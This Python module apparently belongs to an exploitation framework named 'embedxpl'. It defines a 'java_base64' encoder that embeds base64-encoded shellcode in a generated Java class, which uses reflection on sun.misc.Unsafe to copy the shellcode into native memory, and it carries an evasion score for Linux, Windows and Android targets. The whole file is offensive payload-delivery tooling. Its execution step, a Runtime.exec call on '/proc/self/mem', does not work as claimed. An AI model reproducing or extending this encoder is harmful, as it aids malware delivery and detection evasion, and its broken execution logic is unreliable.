"""Java base64 encoder — gera classe Java com payload embutido."""

import base64
from embedxpl.core.exploit.encoder import BaseEncoder


class Encoder(BaseEncoder):
    name        = "java/java_base64"
    description = "Java base64 encoder — generates Java class with runtime shellcode exec"
    arch        = ["x64", "arm64"]
    platform    = ["linux", "windows", "android"]
    evasion_score = 5

    options = {
        "CLASS_NAME": {
            "description": "Java class name",
            "required": False,
            "default": "Payload",
            "value": "Payload",
        },
    }

    def encode(self, payload: bytes) -> bytes:
        b64 = base64.b64encode(payload).decode()
        cls = self.options["CLASS_NAME"]["value"]
        java_src = f"""import java.util.Base64;
import java.lang.reflect.Method;
import java.lang.reflect.Field;

public class {cls} {{
    public static void main(String[] args) throws Exception {{
        byte[] sc = Base64.getDecoder().decode("{b64}");
        // Allocate executable memory via JNA or sun.misc.Unsafe
        Class<?> unsafe = Class.forName("sun.misc.Unsafe");
        Field f = unsafe.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Object u = f.get(null);
        Method alloc = unsafe.getMethod("allocateMemory", long.class);
        long addr = (Long) alloc.invoke(u, sc.length);
        Method copy = unsafe.getMethod("copyMemory", Object.class, long.class,
            Object.class, long.class, long.class);
        copy.invoke(u, sc, 16L, null, addr, sc.length);
        // Execute: requires native bridge (ProcessBuilder or JNA)
        Runtime.getRuntime().exec(new String[]{{"/proc/self/mem"}});
    }}
}}"""
        return java_src.encode()
